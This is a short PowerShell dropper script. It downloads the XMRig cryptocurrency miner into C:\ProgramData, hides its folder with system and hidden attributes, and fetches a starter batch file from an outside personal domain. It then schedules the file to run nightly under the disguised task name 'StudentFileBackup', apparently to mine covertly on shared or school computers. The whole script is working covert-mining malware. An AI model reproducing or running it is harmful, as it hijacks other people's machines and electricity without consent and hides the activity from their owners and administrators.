cd C:\ProgramData

# download XMRig archive
iwr https://github.com/xmrig/xmrig/releases/download/v6.8.2/xmrig-6.8.2-gcc-win64.zip -OutFile xmrig.zip

# inflate XMRig archive
Expand-Archive ./xmrig.zip

# remove XMRig archive
rm ./xmrig.zip

# hide XMRig folder
attrib +s +h ./xmrig

# go to XMRig folder
cd xmrig
cd xmrig-6.8.2

# download starter file
iwr https://www.thatonelukas.tk/masseisStarter.bat -OutFile starter.bat

schtasks /create /sc daily /tn StudentFileBackup /tr "C:\ProgramData\xmrig\xmrig-6.8.2\starter.bat" /st 20:00 /et 06:30 /k
